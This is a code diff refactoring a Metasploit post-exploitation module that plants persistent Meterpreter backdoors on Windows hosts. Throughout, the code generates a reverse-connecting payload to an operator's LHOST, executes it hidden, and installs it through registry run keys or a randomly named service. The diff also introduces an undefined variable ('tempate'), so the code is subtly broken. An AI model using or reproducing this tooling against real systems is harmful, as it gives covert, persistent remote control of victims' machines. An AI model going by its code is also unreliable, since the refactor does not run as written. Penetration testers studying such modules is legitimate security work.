@@ -39,7 +39,7 @@ class Metasploit3 < Msf::Post
 			'Author'        =>
 				[
 					'Carlos Perez <carlos_perez[at]darkoperator.com>',
-					'Merlyn drforbin Cousins <drforbin6[at]gmail.com>',
+					'Merlyn drforbin Cousins <drforbin6[at]gmail.com>'
 				],
 			'Platform'      => [ 'win' ],
 			'Actions'       =>
@@ -64,6 +64,7 @@ class Metasploit3 < Msf::Post
 				OptBool.new('HANDLER', [true, 'Start a multi/handler to receive the session.', true]),
 				OptEnum.new('STARTUP', [true, 'Startup type for the payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
 				OptString.new('PATH', [true, 'PATH to write payload', '%TEMP%']),
+				OptBool.new('EXEC', [true, 'Execute the payload as soon as it\'s uploaded.', true]),
 				# ACTION=MSF
 				OptAddress.new('LHOST', [false, 'IP for Meterpeter payload to connect to.']),
 				OptEnum.new('PAYLOAD_TYPE', [false, 'Meterpreter payload type.', 'TCP', ['TCP', 'HTTP', 'HTTPS']]),
@@ -87,46 +88,50 @@ class Metasploit3 < Msf::Post
 	#-------------------------------------------------------------------------------
 	def run
 		# Set vars
-		rexe = datastore['REXE']
-		rexename = datastore['REXENAME']
+		action = datastore['ACTION'].upcase
+		delay = datastore['DELAY']
+		encoder = datastore['ENCODER']
+		exec = datastore['EXEC']
+		handler = datastore['HANDLER']
+		iterations = datastore['ITERATIONS']
 		lhost = datastore['LHOST']
 		lport = datastore['LPORT']
 		opts = datastore['OPTIONS']
-		delay = datastore['DELAY']
-		encoder = datastore['ENCODER']
-		iterations = datastore['ITERATIONS']
+		path = datastore['PATH'] || expand_path("%TEMP%")
+		payload_type = datastore['PAYLOAD_TYPE']
+		rexe = datastore['REXE']
+		rexename = datastore['REXENAME']
+		startup = datastore['STARTUP']
+		template = datastore['TEMPLATE']
 		@clean_up_rc = ""
 		host,port = session.session_host, session.session_port
 		payload = "windows/meterpreter/reverse_tcp"
-		path = datastore['PATH'] || expand_path("%TEMP%")
 
 		# Check user input
-		if action.name.upcase == 'MSF' or action.name.upcase == 'TEMPLATE'   # TEMPLATE - legacy
+		if action == 'MSF' or action == 'TEMPLATE'   # TEMPLATE - legacy
 			action = 'MSF'
 			print_status("Action: MSF (will generate a new payload for use)")
 
-			if datastore['LHOST'].nil? or datastore['LHOST'].empty?
+			if lhost.nil? or lhost.empty?
 				print_error("Please set LHOST")
 				return
 			end
 
-			if !datastore['LPORT'].between?(1,65535)
+			if !lport.between?(1,65535)
 				print_error("Please set LPORT")
 				return
 			end
 
 			# Check to see if the template file actually exists
-			if datastore['TEMPLATE']
-				if not ::File.exists?(datastore['TEMPLATE'])
+			if tempate
+				if not ::File.exists?(tempate)
 					print_error "Template file doesn't exists"
 					return
-				else
-					template_pe = datastore['TEMPLATE']
 				end
 			end
 
 			# Set the 'correct' payload
-			case datastore['PAYLOAD_TYPE']
+			case payload_type
 				when /TCP/i
 					payload = "windows/meterpreter/reverse_tcp"
 				when /HTTP/i
@@ -134,17 +139,17 @@ class Metasploit3 < Msf::Post
 				when /HTTPS/i
 					payload = "windows/meterpreter/reverse_https"
 			end
-		elsif action.name.upcase == 'CUSTOM' or action.name.upcase == 'REXE'   # REXE - legacy
-			action.name = 'CUSTOM'
+		elsif action == 'CUSTOM' or action == 'REXE'   # REXE - legacy
+			action = 'CUSTOM'
 			print_status("Action: CUSTOM (using a custom binary)")
 
-			if datastore['REXE'].nil? or datastore['REXE'].empty?
+			if rexe.nil? or rexe.empty?
 				print_error("Please set REXE")
 				return
 			end
 
-			if not ::File.exist?(datastore['REXE'])
-				print_error("REXE (#{datastore['REXE']}) doesn't exist!")
+			if not ::File.exist?(rexe)
+				print_error("REXE (#{rexe}) doesn't exist!")
 				return
 			end
 
@@ -156,7 +161,7 @@ class Metasploit3 < Msf::Post
 				rexename += '.exe'
 			end
 		else
-			print_error("Unknwon ACTION (#{action.name.upcase})")
+			print_error("Unknwon ACTION (#{action})")
 			return
 		end
 
@@ -164,10 +169,10 @@ class Metasploit3 < Msf::Post
 		print_status("Running module against #{sysinfo['Computer']}")
 
 		# Create/load payload
-		if action.name.upcase == 'MSF'
+		if action == 'MSF'
 			pay = create_payload(payload, lhost, lport, opts = "")
 			raw = pay_gen(pay,encoder, iterations)
-			script = create_script(delay, template_pe, raw)
+			script = create_script(delay, template, raw)
 		else
 			raw = create_payload_from_file(rexe)
 		end
@@ -178,19 +183,21 @@ class Metasploit3 < Msf::Post
 			return
 		end
 
-		# Start handler if set
-		if datastore['HANDLER']
-			if datastore['LHOST'] and datastore['LPORT']
+		# Start handler (if set)
+		if handler
+			if lhost and lport
 				create_multihand(payload, lhost, lport)
 			else
 				print_error("Skipping multi/handler: LHOST/LPORT isn't set")
 			end
 		end
 
-		# Initial execution of payload
-		target_exec(script_on_target)
+		# Initial execution of payload (if set)
+		if exec
+			target_exec(script_on_target)
+		end
 
-		case datastore['STARTUP']
+		case startup
 			when /USER/i
 				write_to_reg("HKCU",script_on_target)
 			when /SYSTEM/i
@@ -370,7 +377,7 @@ class Metasploit3 < Msf::Post
 	#-------------------------------------------------------------------------------
 	def target_exec(script_on_target)
 		print_status("Executing payload #{script_on_target}")
-		proc = action.name.upcase == 'MSF' ? session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true}) :\
+		proc = action == 'MSF' ? session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true}) :\
 			session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
 		print_good("Payload executed with PID #{proc.pid}")
 		@clean_up_rc << "kill #{proc.pid}\n"
@@ -397,7 +404,7 @@ class Metasploit3 < Msf::Post
 			print_status("Installing as service")
 			nam = Rex::Text.rand_text_alpha(rand(8)+8)
 			print_status("Creating service #{nam}")
-			action.name.upcase == 'MSF' ? service_create(nam, nam, "cscript \"#{script_on_target}\"") : \
+			action == 'MSF' ? service_create(nam, nam, "cscript \"#{script_on_target}\"") : \
 				service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
 			print_good("Service successfully created")
 			@clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
@@ -437,8 +444,8 @@ class Metasploit3 < Msf::Post
 
 	# Function to read in custom binary
 	#-------------------------------------------------------------------------------
-	def create_payload_from_file(exec)
-		print_status("Using #{exec} as the payload")
-		return ::IO.read(exec)
+	def create_payload_from_file(filein)
+		print_status("Using #{filein} as the payload")
+		return ::IO.read(filein)
 	end
 end
